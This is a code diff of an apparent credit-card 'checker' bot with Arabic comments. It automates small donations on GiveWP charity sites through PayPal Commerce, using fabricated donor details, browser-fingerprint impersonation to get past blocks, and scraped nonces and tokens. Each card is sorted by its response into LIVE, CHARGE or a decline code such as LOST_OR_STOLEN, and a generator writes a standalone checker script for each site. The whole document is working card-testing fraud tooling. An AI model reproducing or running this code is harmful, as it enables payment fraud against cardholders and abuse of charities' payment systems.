-            ('input[name*="phone"]', '5551234567'),
-        ]
-        
-        for sel, val in billing:
-            try:
-                loc = page.locator(sel).first
-                if await loc.count() > 0 and await loc.is_visible(timeout=500):
-                    tag = await loc.evaluate('el => el.tagName.toLowerCase()')
-                    if tag == 'select':
-                        try:
-                            await loc.select_option(val, timeout=1000)
-                        except:
-                            try:
-                                await loc.select_option(index=1, timeout=1000)
-                            except:
-                                pass
-                    else:
-                        await loc.fill(val, timeout=1500)
-            except:
-                continue
-    
-    # ═══════════════════════════════════════════════════════════════
-    # TERMS
-    # ═══════════════════════════════════════════════════════════════
-    
-    async def _check_terms(self, page):
-        """يوافق على الشروط"""
-        sels = [
-            'input[type="checkbox"][name*="terms"]',
-            'input[type="checkbox"][name*="agree"]',
-            'input[type="checkbox"][name*="condition"]',
-            'input[type="checkbox"][name*="accept"]',
-            'input.give_agree_to_terms',
-        ]
-        for sel in sels:
-            try:
-                cbs = await page.locator(sel).all()
-                for cb in cbs:
-                    try:
-                        if not await cb.is_checked():
-                            await cb.check(timeout=1000, force=True)
-                    except:
-                        try:
-                            await cb.click(timeout=1000, force=True)
-                        except:
-                            pass
-            except:
-                continue
-    
-    # ═══════════════════════════════════════════════════════════════
-    # CLICK DONATE
-    # ═══════════════════════════════════════════════════════════════
-    
-    async def _click_donate(self, page):
-        """يضغط زر التبرع — 8 محاولات"""
-        sels = [
-            'button.give-submit',
-            'input.give-submit',
-            'button[type="submit"][class*="give"]',
-            'input[type="submit"][value*="Donate" i]',
-            'button:has-text("Donate Now")',
-            'button:has-text("Donate")',
-            'button:has-text("Give Now")',
-            'button:has-text("Give")',
-            'button:has-text("Submit")',
-            'button[type="submit"]',
-            'input[type="submit"]',
-        ]
-        for sel in sels:
-            try:
-                btn = page.locator(sel).first
-                if await btn.count() > 0 and await btn.is_visible(timeout=800):
-                    await btn.scroll_into_view_if_needed(timeout=2000)
-                    await page.wait_for_timeout(300)
-                    try:
-                        await btn.click(timeout=5000)
-                    except:
-                        await btn.click(timeout=5000, force=True)
-                    self.log(f'      ✅ clicked: {sel}')
-                    return True
-            except:
-                continue
-        return False
-    
-    # ═══════════════════════════════════════════════════════════════
-    # WAIT PAYPAL
-    # ═══════════════════════════════════════════════════════════════
-    
-    async def _wait_paypal(self, page, timeout=20):
-        """ينتظر PayPal iframe أو card form"""
-        iterations = timeout * 2  # كل 0.5s
-        for i in range(iterations):
-            # 1. ابحث في الفريمات
-            for frame in page.frames:
-                if frame == page.main_frame:
+                if HAS_CURL_CFFI:
+                    r = self.session.get(url, headers=headers, impersonate="chrome133a", timeout=25)
+                else:
+                    headers['User-Agent'] = self.user_agent
+                    r = self.session.get(url, headers=headers, timeout=25)
+
+                self.cookies = dict(self.session.cookies)
+                if r.status_code == 200 and r.text:
+                    self.html = r.text
+                    self.is_valid = True
+                    return
+                elif r.status_code == 403 and HAS_CURL_CFFI and attempt < 2:
+                    profiles = ["chrome124", "safari18_0", "firefox135"]
+                    self.session = curl_requests.Session(impersonate=profiles[attempt])
                     continue
-                furl = frame.url.lower()
-                if any(k in furl for k in ['paypal', 'braintree', 'card-fields', 'hosted-fields']):
+            except Exception:
+                time.sleep(2 * (attempt + 1))
+
+        self.html = ''
+        self.is_valid = False
+
+    def _extract_and_setup(self):
+        if not self.html:
+            return
+
+        extracted = GatewayExtractor.extract_all(self.html)
+
+        self.client_id = (extracted.get('client_id') or [None])[0]
+        self.form_data['give-form-id'] = (extracted.get('form_id') or [''])[0]
+        self.form_data['give-form-hash'] = (extracted.get('form_hash') or [''])[0]
+        self.form_data['_wpnonce'] = (extracted.get('nonce') or [''])[0]
+        self.currency = (extracted.get('currency') or ['USD'])[0].upper()
+        self.minimum_amount = (extracted.get('amount') or ['1.00'])[0]
+        self.terms_fields = extracted.get('terms_accept') or []
+        self.prefix_field = (extracted.get('prefix_field') or [None])[0]
+
+        if extracted.get('ajax_url'):
+            self.ajax_url = extracted['ajax_url'][0]
+            if self.ajax_url.startswith('/'):
+                self.ajax_url = f'https://{self.url}{self.ajax_url}'
+
+        sdk_urls = extracted.get('paypal_sdk_url') or []
+        for sdk in sdk_urls:
+            parsed_sdk = OAuthHelper.parse_sdk_url(sdk)
+            if parsed_sdk.get('client-id') and not self.client_id:
+                self.client_id = parsed_sdk['client-id']
+            if parsed_sdk.get('currency'):
+                self.currency = parsed_sdk['currency'].upper()
+            if parsed_sdk.get('client-token'):
+                self.client_token = parsed_sdk['client-token']
+
+        if self.currency not in PAYPAL_CURRENCIES:
+            self.currency = 'USD'
+
+    def _get_tokens(self):
+        if not self.is_valid:
+            return
+
+        if self.client_id and not self.client_token:
+            oauth = OAuthHelper.fetch_client_credentials(
+                self.session, self.client_id, self.client_secret
+            )
+            if oauth and oauth.get('access_token'):
+                self.access_token = oauth['access_token']
+
+        if self.ajax_url and not self.client_token:
+            hdrs = {
+                'X-Requested-With': 'XMLHttpRequest',
+                'Referer': f'https://{self.url}{self.inurl}',
+                'Origin': f'https://{self.url}',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            }
+            tok = OAuthHelper.fetch_client_token(
+                self.session, self.ajax_url,
+                self.form_data.get('give-form-id'),
+                self.form_data.get('_wpnonce'),
+                self.cookies, hdrs, self.url, self.inurl,
+            )
+            if tok and tok.get('client_token'):
+                self.client_token = tok['client_token']
+
+    def _pick_name_and_title(self):
+        first_pool = [
+            'James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard',
+            'Joseph', 'Thomas', 'Charles', 'Mary', 'Patricia', 'Jennifer', 'Linda',
+            'Elizabeth', 'Barbara', 'Susan', 'Jessica', 'Sarah', 'Karen', 'Nancy',
+            'Lisa', 'Betty', 'Margaret', 'Sandra', 'Ashley', 'Kimberly', 'Emily',
+        ]
+        last_pool = [
+            'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller',
+            'Davis', 'Rodriguez', 'Martinez', 'Wilson', 'Anderson', 'Taylor',
+            'Thomas', 'Moore', 'Jackson', 'Martin', 'Lee', 'Thompson', 'White',
+            'Harris', 'Clark', 'Lewis', 'Walker', 'Hall', 'Allen', 'Young',
+        ]
+
+        first = random.choice(first_pool)
+        last = random.choice(last_pool)
+
+        if first in MALE_NAMES:
+            title = random.choice(TITLES_MALE)
+        else:
+            title = random.choice(TITLES_FEMALE)
+
+        return first, last, title
+
+    def _build_form_data(self, amount):
+        first, last, title = self._pick_name_and_title()
+        email = f"{first.lower()}.{last.lower()}{random.randint(10, 999)}@gmail.com"
+
+        data = dict(self.form_data)
+        data.update({
+            'give-amount': amount,
+            'give-currency': self.currency,
+            'currency': self.currency,
+            'payment-mode': 'paypal-commerce',
+            'give-gateway': 'paypal-commerce',
+            'give_first': first,
+            'give_last': last,
+            'first_name': first,
+            'last_name': last,
+            'give_email': email,
+            'email': email,
+            'give-company': '',
+            'give_comment': '',
+            'give_anonymous': '0',
+            'give_title': title,
+            'title': title,
+            'address1': '123 Main Street',
+            'address2': 'Apt 4B',
+            'city': 'New York',
+            'state': 'NY',
+            'zip': '10001',
+            'country': 'US',
+            'phone': '2125551234',
+            'give-address1': '123 Main Street',
+            'give-city': 'New York',
+            'give-state': 'NY',
+            'give-zip': '10001',
+            'give-country': 'US',
+            'give-phone': '2125551234',
+        })
+
+        for tf in self.terms_fields:
+            data[tf] = '1'
+
+        return data
+
+    def _format_amount(self, amount):
+        if self.currency in ZERO_DECIMAL_CURRENCIES:
+            return str(int(float(amount)))
+        return f"{float(amount):.2f}"
+
+    def _create_order_ajax(self, amount):
+        if not self.ajax_url:
+            return None
+
+        form_data = self._build_form_data(amount)
+        headers = {
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': f'https://{self.url}',
+            'Referer': f'https://{self.url}{self.inurl}',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        }
+
+        actions = [
+            'give_paypal_commerce_create_order',
+            'give_paypal_create_order',
+            'give_create_order',
+            'create_order',
+        ]
+
+        for action in actions:
+            try:
+                r = self.session.post(
+                    self.ajax_url,
+                    params={'action': action},
+                    data=form_data,
+                    headers=headers,
+                    cookies=self.cookies,
+                    timeout=25,
+                )
+                if r.status_code == 200 and r.text:
                     try:
-                        cnt = await frame.locator('input').count()
-                        if cnt > 0:
-                            return frame
-                    except:
+                        j = r.json()
+                        if isinstance(j, dict):
+                            if j.get('success') is True:
+                                data = j.get('data', {})
+                                if isinstance(data, dict):
+                                    if data.get('id'):
+                                        return str(data['id'])
+                                    if data.get('order_id'):
+                                        return str(data['order_id'])
+                                    if data.get('orderID'):
+                                        return str(data['orderID'])
+                            if j.get('id'):
+                                return str(j['id'])
+                            if j.get('order_id'):
+                                return str(j['order_id'])
+                    except Exception:
                         continue
-            
-            # 2. ابحث عن iframe في الصفحة
-            try:
-                iframes = await page.locator('iframe').all()
-                for iframe in iframes:
-                    try:
-                        src = await iframe.get_attribute('src') or ''
-                        title = await iframe.get_attribute('title') or ''
-                        if any(k in (src + title).lower() for k in ['paypal', 'braintree', 'card']):
-                            fr = await iframe.content_frame()
-                            if fr:
-                                try:
-                                    cnt = await fr.locator('input').count()
-                                    if cnt > 0:
-                                        return fr
-                                except:
-                                    pass
-                    except:
-                        continue
-            except:
-                pass
-            
-            # 3. ابحث عن card form في الصفحة الرئيسية (بعض المواقع inline)
-            try:
-                card = page.locator('input[autocomplete="cc-number"], input[name*="cardnumber"], input[name*="card-number"]').first
-                if await card.count() > 0:
-                    return page  # main page
-            except:
-                pass
-            
-            await page.wait_for_timeout(500)
-        
-        return None
-    
-    # ═══════════════════════════════════════════════════════════════
-    # FILL CARD
-    # ═══════════════════════════════════════════════════════════════
-    
-    async def _fill_card_paypal(self, frame, page):
-        """يملأ الكارت في PayPal — 10 محاولات لكل حقل"""
-        try:
-            n, mm, yy, cvc = self.card.split('|')
-            mm = mm.zfill(2)
-            if len(yy) == 4:
-                yy = yy[2:]
-            
-            await asyncio.sleep(2)
-            
-            # ─── email (PayPal بيطلبه أحياناً) ───
-            for sel in ['input[type="email"]', 'input[name*="email"]', 'input[id*="email"]']:
-                try:
-                    loc = frame.locator(sel).first
-                    if await loc.count() > 0 and await loc.is_visible(timeout=500):
-                        await loc.fill(f'u{int(time.time()*1000)%999999}@gmail.com', timeout=2000)
-                        break
-                except:
-                    continue
-            
-            # ─── Card number ───
-            card_filled = False
-            for sel in [
-                'input#credit-card-number',
-                'input[name="cardnumber"]',
-                'input[name="card-number"]',
-                'input[name="cardNumber"]',
-                'input[autocomplete="cc-number"]',
-                'input[placeholder*="Card number" i]',
-                'input[placeholder*="Card Number" i]',
-                'input[placeholder*="card" i][type="tel"]',
-                'input[type="tel"][name*="card"]',
-                'input[data-testid*="card"]',
-            ]:
-                try:
-                    loc = frame.locator(sel).first
-                    if await loc.count() > 0:
-                        await loc.click(timeout=2000)
-                        await loc.fill('', timeout=1000)
-                        # نكتب حرف حرف
-                        await loc.type(n, delay=30, timeout=8000)
-                        card_filled = True
-                        self.log(f'      ✅ card number')
-                        break
-                except:
-                    continue
-            
-            if not card_filled:
-                return {'filled': False, 'error': 'CARD_NUMBER_NOT_FOUND'}
-            
-            await asyncio.sleep(0.5)
-            
-            # ─── Expiry ───
-            for sel in [
-                'input#expiration-date',
-                'input[name="exp"]',
-                'input[name="expiry"]',
-                'input[name="expiration"]',
-                'input[autocomplete="cc-exp"]',
-                'input[placeholder*="MM / YY" i]',
-                'input[placeholder*="MM/YY" i]',
-                'input[placeholder*="expiration" i]',
-                'input[placeholder*="expiry" i]',
-                'input[name*="expire"]',
-            ]:
-                try:
-                    loc = frame.locator(sel).first
-                    if await loc.count() > 0:
-                        await loc.click(timeout=1500)
-                        await loc.fill('', timeout=1000)
-                        await loc.type(f'{mm}{yy}', delay=30, timeout=3000)
-                        self.log(f'      ✅ expiry')
-                        break
-                except:
-                    continue
-            
-            # ─── CVC ───
-            for sel in [
-                'input#cvv',
-                'input#cvc',
-                'input[name="cvv"]',
-                'input[name="cvc"]',
-                'input[name="securityCode"]',
-                'input[autocomplete="cc-csc"]',
-                'input[placeholder*="CVV" i]',
-                'input[placeholder*="CVC" i]',
-                'input[placeholder*="security code" i]',
-            ]:
-                try:
-                    loc = frame.locator(sel).first
-                    if await loc.count() > 0:
-                        await loc.click(timeout=1500)
-                        await loc.fill('', timeout=1000)
-                        await loc.type(cvc, delay=30, timeout=3000)
-                        self.log(f'      ✅ cvc')
-                        break
-                except:
-                    continue
-            
-            await asyncio.sleep(0.5)
-            return {'filled': True}
-        except Exception as e:
-            return {'filled': False, 'error': str(e)[:200]}
-    
-    # ═══════════════════════════════════════════════════════════════
-    # SUBMIT PAYMENT
-    # ═══════════════════════════════════════════════════════════════
-    
-    async def _submit_payment(self, frame, page):
-        """يضغط زر الدفع في PayPal"""
-        sels = [
-            'button:has-text("Pay")',
-            'button:has-text("Continue")',
-            'button:has-text("Complete")',
-            'button:has-text("Submit")',
-            'button[type="submit"]',
-            'button#btn-pay',
-            'button[id*="pay"]',
-            'button[data-testid*="pay"]',
-        ]
-        for sel in sels:
-            try:
-                btn = frame.locator(sel).first
-                if await btn.count() > 0 and await btn.is_visible(timeout=800):
-                    await btn.click(timeout=5000)
-                    self.log(f'      ✅ payment submitted')
-                    return True
-            except:
+            except Exception:
                 continue
-        return False
-    
-    # ═══════════════════════════════════════════════════════════════
-    # READ FINAL RESPONSE
-    # ═══════════════════════════════════════════════════════════════
-    
-    async def _read_final_response(self, page, frame):
-        """يقرأ الرد النهائي من الصفحة + network"""
-        
-        # 1. جرّب من network logs أولاً
-        for resp in self.debug['paypal_responses']:
-            text = resp.get('body', '')
-            status, code = Classifier.classify(text)
-            if status == 'LIVE' or code not in ('UNKNOWN', 'EMPTY'):
-                return {
-                    'status': status,
-                    'code': code,
-                    'raw': text[:300],
+
+        return None
+
+    def _create_order_v2(self, amount):
+        token = self.access_token or self.client_token
+        if not token:
+            return None
+
+        formatted = self._format_amount(amount)
+        headers = {
+            'Authorization': f'Bearer {token}',
+            'Content-Type': 'application/json',
+            'Accept': 'application/json',
+            'PayPal-Client-Metadata-Id': self.client_id or '',
+        }
+        payload = {
+            'intent': 'CAPTURE',
+            'purchase_units': [{
+                'amount': {
+                    'currency_code': self.currency,
+                    'value': formatted,
                 }
-        
-        # 2. اقرأ من الصفحة
-        texts = []
+            }],
+            'application_context': {
+                'shipping_preference': 'NO_SHIPPING',
+                'user_action': 'PAY_NOW',
+            },
+        }
+
         try:
-            if frame:
-                texts.append(await frame.inner_text('body'))
-        except:
+            r = self.session.post(
+                'https://api-m.paypal.com/v2/checkout/orders',
+                headers=headers,
+                json=payload,
+                timeout=25,
+            )
+            if r.status_code in (200, 201):
+                j = r.json()
+                if j.get('id'):
+                    return j['id']
+        except Exception:
             pass
-        
+
+        return None
+
+    def _confirm_payment_source(self, order_id, card_number, expiry, cvc):
+        token = self.client_token or self.access_token or self.client_id
+        if not token:
+            return None
+
+        headers = {
+            'Authorization': f'Bearer {token}',
+            'Content-Type': 'application/json',
+            'PayPal-Client-Metadata-Id': self.client_id or '',
+        }
+        payload = {
+            'payment_source': {
+                'card': {
+                    'number': card_number,
+                    'expiry': expiry,
+                    'security_code': cvc,
+                    'attributes': {
+                        'verification': {'method': 'SCA_WHEN_REQUIRED'}
+                    },
+                }
+            },
+            'application_context': {'vault': False},
+        }
+
         try:
-            texts.append(await page.inner_text('body'))
-        except:
-            pass
-        
-        for text in texts:
-            if not text:
+            r = self.session.post(
+                f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
+                headers=headers,
+                json=payload,
+                timeout=25,
+            )
+            return r
+        except Exception:
+            return None
+
+    def _approve_order_ajax(self, order_id, amount):
+        if not self.ajax_url:
+            return None
+
+        form_data = self._build_form_data(amount)
+        headers = {
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': f'https://{self.url}',
+            'Referer': f'https://{self.url}{self.inurl}',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        }
+
+        actions = [
+            'give_paypal_commerce_approve_order',
+            'give_paypal_approve_order',
+            'give_approve_order',
+            'approve_order',
+        ]
+
+        for action in actions:
+            try:
+                r = self.session.post(
+                    self.ajax_url,
+                    params={'action': action, 'order': order_id},
+                    data=form_data,
+                    headers=headers,
+                    cookies=self.cookies,
+                    timeout=25,
+                )
+                if r.status_code == 200 and r.text:
+                    return r
+            except Exception:
                 continue
-            status, code = Classifier.classify(text)
-            if status == 'LIVE':
-                return {'status': 'LIVE', 'code': code, 'raw': text[:300]}
-        
-        # 3. ابحث عن alert/error محدد
+
+        return None
+
+    def _capture_order(self, order_id):
+        token = self.access_token or self.client_token
+        if not token:
+            return None
+
+        headers = {
+            'Authorization': f'Bearer {token}',
+            'Content-Type': 'application/json',
+            'Accept': 'application/json',
+        }
+
         try:
-            alerts = await page.locator('[role="alert"], .give_error, .error, .alert').all()
-            for alert in alerts:
-                t = await alert.inner_text()
-                if t:
-                    status, code = Classifier.classify(t)
-                    return {'status': status, 'code': code, 'raw': t[:300]}
-        except:
+            r = self.session.post(
+                f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture',
+                headers=headers,
+                timeout=25,
+            )
+            return r
+        except Exception:
+            return None
+
+    @staticmethod
+    def classify_response(text):
+        if not text:
+            return 'DECLINED'
+
+        checks = [
+            ('Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction.', 'Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction.'),
+            ('There was an issue with your donation transaction: Your card was declined.', 'There was an issue with your donation transaction: Your card was declined.'),
+            ('There was an issue with your donation transaction: Your card was insufficient.', 'There was an issue with your donation transaction: Your card was insufficient.'),
+            ('ORDER_NOT_APPROVED', 'Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction.'),
+            ('DO_NOT_HONOR', 'Do not honor'),
+            ('ACCOUNT_CLOSED', 'Account closed'),
+            ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'Account closed'),
+            ('LOST_OR_STOLEN', 'LOST OR STOLEN'),
+            ('CVV2_FAILURE', 'Card Issuer Declined CVV'),
+            ('SUSPECTED_FRAUD', 'SUSPECTED FRAUD'),
+            ('INVALID_ACCOUNT', 'INVALID_ACCOUNT'),
+            ('REATTEMPT_NOT_PERMITTED', 'REATTEMPT NOT PERMITTED'),
+            ('ACCOUNT_BLOCKED_BY_ISSUER', 'ACCOUNT_BLOCKED_BY_ISSUER'),
+            ('PICKUP_CARD_SPECIAL_CONDITIONS', 'PICKUP_CARD_SPECIAL_CONDITIONS'),
+            ('PAYER_CANNOT_PAY', 'PAYER CANNOT PAY'),
+            ('INSUFFICIENT_FUNDS', 'Insufficient Funds'),
+            ('GENERIC_DECLINE', 'GENERIC_DECLINE'),
+            ('COMPLIANCE_VIOLATION', 'COMPLIANCE VIOLATION'),
+            ('TRANSACTION_NOT_PERMITTED', 'TRANSACTION NOT PERMITTED'),
+            ('PAYMENT_DENIED', 'PAYMENT_DENIED'),
+            ('INVALID_TRANSACTION', 'INVALID TRANSACTION'),
+            ('RESTRICTED_OR_INACTIVE_ACCOUNT', 'RESTRICTED OR INACTIVE ACCOUNT'),
+            ('SECURITY_VIOLATION', 'SECURITY_VIOLATION'),
+            ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED DUE TO UPDATED ACCOUNT'),
+            ('INVALID_OR_RESTRICTED_CARD', 'INVALID CARD'),
+            ('EXPIRED_CARD', 'EXPIRED CARD'),
+            ('CRYPTOGRAPHIC_FAILURE', 'CRYPTOGRAPHIC FAILURE'),
+            ('TRANSACTION_CANNOT_BE_COMPLETED', 'TRANSACTION CANNOT BE COMPLETED'),
+            ('DECLINED_PLEASE_RETRY', 'DECLINED PLEASE RETRY LATER'),
+            ('TX_ATTEMPTS_EXCEED_LIMIT', 'EXCEED LIMIT'),
+            ('INSTRUMENT_DECLINED', 'INSTRUMENT_DECLINED'),
+        ]
+
+        text_upper = text.upper()
+        for key, label in checks:
+            if key.upper() in text_upper:
+                return label
+
+        if text.strip().lower() == 'true':
+            return 'CHARGE'
+
+        try:
+            j = json.loads(text)
+            if isinstance(j, dict):
+                if j.get('success') is True:
+                    return 'CHARGE'
+                data = j.get('data', {})
+                if isinstance(data, dict):
+                    err = data.get('error')
+                    if isinstance(err, dict):
+                        details = err.get('details', [])
+                        if details and isinstance(details, list):
+                            issue = details[0].get('issue', '')
+                            desc = details[0].get('description', '')
+                            if issue:
+                                return f"{issue}: {desc}" if desc else issue
+                        msg = err.get('message', '')
+                        if msg:
+                            return msg
+                    order = data.get('order', {})
+                    if isinstance(order, dict) and order.get('status'):
+                        return str(order['status'])
+                if j.get('message'):
+                    return str(j['message'])
+        except Exception:
             pass
-        
-        # 4. لو كل حاجة فشلت، ارجع UNKNOWN
-        return {'status': 'UNKNOWN', 'code': 'NO_RESPONSE',
-                'raw': (texts[0] if texts else '')[:300]}
 
+        return text.strip()[:300]
 
-# ═══════════════════════════════════════════════════════════════════════
-# RUNNER
-# ═══════════════════════════════════════════════════════════════════════
+    def charge(self, card_str, amount='1.00'):
+        if not self.is_valid:
+            return {'status': 'INVALID_GATEWAY', 'response': 'Site unreachable or not a PayPal-Commerce form'}
 
-async def test_sites(card, sites):
-    print('=' * 70)
-    print('🔥 Playwright GiveWP Engine v12')
-    print('=' * 70)
-    print(f'💳 {card}')
-    print(f'🌐 {len(sites)} sites')
-    print('=' * 70)
-    
-    summary = []
-    for name, url in sites:
-        print(f'\n{"━" * 70}\n🌐 {name}\n{"━" * 70}')
-        start = time.time()
+        parts = card_str.strip().split('|')
+        if len(parts) < 4:
+            return {'status': 'ERROR', 'response': 'Invalid card format (expected n|mm|yy|cvc)'}
+
+        card_number = parts[0].strip()
+        mm = parts[1].strip()
+        yy = parts[2].strip()
+        cvc = parts[3].strip()
+
+        if '20' in yy:
+            yy = yy.split('20')[1]
+
+        expiry = f"20{yy}-{mm}"
+
+        order_id = self._create_order_ajax(amount)
+        ajax_order_used = bool(order_id)
+
+        if not order_id:
+            order_id = self._create_order_v2(amount)
+
+        if not order_id:
+            return {'status': 'ERROR', 'response': 'Create Order Failed'}
+
+        confirm_res = self._confirm_payment_source(order_id, card_number, expiry, cvc)
+
+        if confirm_res and confirm_res.text:
+            classified = self.classify_response(confirm_res.text)
+
+            if classified == 'CHARGE':
+                capture_res = self._capture_order(order_id)
+                if capture_res and capture_res.text:
+                    classified = self.classify_response(capture_res.text)
+                return {
+                    'status': 'LIVE',
+                    'response': classified,
+                    'raw': capture_res.text if capture_res else confirm_res.text,
+                    'order_id': order_id,
+                }
+
+            if ajax_order_used:
+                approve_res = self._approve_order_ajax(order_id, amount)
+                if approve_res and approve_res.text:
+                    classified = self.classify_response(approve_res.text)
+                    return {
+                        'status': 'LIVE',
+                        'response': classified,
+                        'raw': approve_res.text,
+                        'order_id': order_id,
+                    }
+
+            return {
+                'status': 'LIVE',
+                'response': classified,
+                'raw': confirm_res.text,
+                'order_id': order_id,
+            }
+
+        if ajax_order_used:
+            approve_res = self._approve_order_ajax(order_id, amount)
+            if approve_res and approve_res.text:
+                classified = self.classify_response(approve_res.text)
+                return {
+                    'status': 'LIVE',
+                    'response': classified,
+                    'raw': approve_res.text,
+                    'order_id': order_id,
+                }
+
+        return {'status': 'ERROR', 'response': 'No response from site'}
+
+    def close(self):
         try:
-            eng = PlaywrightEngine(url, card, verbose=True, screenshots=False)
-            result = await eng.run()
-            elapsed = time.time() - start
-            icon = '✅' if result['status'] == 'LIVE' else '❌'
-            print(f'\n  {icon} {result["status"]} | {result["code"]} ({elapsed:.1f}s)')
-            if result.get('raw'):
-                print(f'     raw: {result["raw"][:200]}')
-            print(f'     amount={result["debug"].get("amount_selected")} '
-                  f'| paypal={result["debug"].get("paypal_frame")} '
-                  f'| card={result["debug"].get("card_filled")}')
-            summary.append((name, result['status'], result['code'], elapsed))
+            self.session.close()
+        except Exception:
+            pass
+
+
+# ═══════════════════════════════════════════════════════════════════
+# GATEWAY CODE GENERATOR — بيولّد سكريبت الـ checker بناءً على الموقع
+# ═══════════════════════════════════════════════════════════════════
+
+def generate_gateway_code(result, link, paypal_obj=None, live_idx=1):
+    """
+    بيولّد سكريبت python مستقل للـ checker على الموقع ده.
+    آمن — لو paypal_obj مش موجود، بيستخدم قيم فاضية.
+    """
+    id_form = paypal_obj.form_data.get('give-form-id', '') if paypal_obj else ''
+    form_hash = paypal_obj.form_data.get('give-form-hash', '') if paypal_obj else ''
+    wp_nonce = paypal_obj.form_data.get('_wpnonce', '') if paypal_obj else ''
+    client_token = (paypal_obj.client_token or '') if paypal_obj else ''
+    client_id = (paypal_obj.client_id or '') if paypal_obj else ''
+    currency = (paypal_obj.currency or 'USD') if paypal_obj else 'USD'
+    ajax_url = (paypal_obj.ajax_url or '') if paypal_obj else ''
+    url_host = (paypal_obj.url or '') if paypal_obj else ''
+    in_url = (paypal_obj.inurl or '') if paypal_obj else ''
+    amount = (paypal_obj.minimum_amount or '1.00') if paypal_obj else '1.00'
+
+    # نتأكد إن قيم الـ string مفيهاش } أو { تسبب مشكلة في f-string
+    def safe(s):
+        return str(s).replace('{', '{{').replace('}', '}}')
+
+    code = f'''# -*- coding: utf-8 -*-
+# Generated by PayPal-Commerce Checker Bot
+# Site: {link}
+# Amount: {amount} {currency}
+# Live Response: {safe(result)[:100]}
+
+import requests, random, time, json
+from urllib.parse import urlparse
+
+class Checker:
+    def __init__(self):
+        self.url = "{safe(url_host)}"
+        self.inurl = "{safe(in_url)}"
+        self.ajax_url = "{safe(ajax_url)}"
+        self.form_id = "{safe(id_form)}"
+        self.form_hash = "{safe(form_hash)}"
+        self.wp_nonce = "{safe(wp_nonce)}"
+        self.client_token = "{safe(client_token)}"
+        self.client_id = "{safe(client_id)}"
+        self.currency = "{safe(currency)}"
+        self.amount = "{safe(amount)}"
+
+        self.first_names = ["James", "John", "Mary", "Linda", "Robert", "Patricia"]
+        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
+        self.email_domain = "gmail.com"
+        self.session = requests.Session()
+        self.session.headers.update({{
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": f"https://{{self.url}}",
+            "Referer": f"https://{{self.url}}{{self.inurl}}",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        }})
+
+    def build_form(self):
+        first = random.choice(self.first_names)
+        last = random.choice(self.last_names)
+        email = f"{{first.lower()}}.{{last.lower()}}{{random.randint(10,999)}}@{{self.email_domain}}"
+        if first in ("James","John","Robert"):
+            title = random.choice(["Mr","Dr"])
+        else:
+            title = random.choice(["Mrs","Ms","Miss","Dr"])
+        return {{
+            "give-form-id": self.form_id,
+            "give-form-hash": self.form_hash,
+            "_wpnonce": self.wp_nonce,
+            "give-amount": self.amount,
+            "give-currency": self.currency,
+            "currency": self.currency,
+            "payment-mode": "paypal-commerce",
+            "give-gateway": "paypal-commerce",
+            "give_first": first,
+            "give_last": last,
+            "give_email": email,
+            "give_title": title,
+            "give_anonymous": "0",
+            "address1": "123 Main Street",
+            "city": "New York",
+            "state": "NY",
+            "zip": "10001",
+            "country": "US",
+            "phone": "2125551234",
+            "give_agree_to_terms": "1",
+            "give_terms_agreement": "1",
+        }}
+
+    def classify(self, text):
+        if not text:
+            return "DECLINED"
+        checks = [
+            ("Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction.", "Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction."),
+            ("There was an issue with your donation transaction: Your card was declined.", "There was an issue with your donation transaction: Your card was declined."),
+            ("There was an issue with your donation transaction: Your card was insufficient.", "There was an issue with your donation transaction: Your card was insufficient."),
+            ("ORDER_NOT_APPROVED", "Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction."),
+            ("DO_NOT_HONOR", "Do not honor"),
+            ("ACCOUNT_CLOSED", "Account closed"),
+            ("LOST_OR_STOLEN", "LOST OR STOLEN"),
+            ("CVV2_FAILURE", "Card Issuer Declined CVV"),
+            ("SUSPECTED_FRAUD", "SUSPECTED FRAUD"),
+            ("INSUFFICIENT_FUNDS", "Insufficient Funds"),
+            ("INSTRUMENT_DECLINED", "INSTRUMENT_DECLINED"),
+        ]
+        up = text.upper()
+        for key, label in checks:
+            if key.upper() in up:
+                return label
+        if text.strip().lower() == "true":
+            return "CHARGE"
+        try:
+            j = json.loads(text)
+            if isinstance(j, dict):
+                if j.get("success") is True:
+                    return "CHARGE"
+                data = j.get("data", {{}})
+                if isinstance(data, dict):
+                    err = data.get("error")
+                    if isinstance(err, dict):
+                        details = err.get("details", [])
+                        if details and isinstance(details, list):
+                            issue = details[0].get("issue", "")
+                            desc = details[0].get("description", "")
+                            if issue:
+                                return f"{{issue}}: {{desc}}" if desc else issue
+                        msg = err.get("message", "")
+                        if msg:
+                            return msg
+        except Exception:
+            pass
+        return text.strip()[:300]
+
+    def charge(self, card):
+        parts = card.strip().split("|")
+        if len(parts) < 4:
+            return "Invalid card format"
+        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
+        if "20" in yy:
+            yy = yy.split("20")[1]
+        expiry = f"20{{yy}}-{{mm}}"
+
+        form = self.build_form()
+        try:
+            r = self.session.post(self.ajax_url, params={{"action": "give_paypal_commerce_create_order"}}, data=form, timeout=25)
+            j = r.json()
+            order_id = None
+            if isinstance(j, dict):
+                if j.get("success") is True:
+                    d = j.get("data", {{}})
+                    if isinstance(d, dict):
+                        order_id = d.get("id") or d.get("order_id") or d.get("orderID")
+                if not order_id:
+                    order_id = j.get("id") or j.get("order_id")
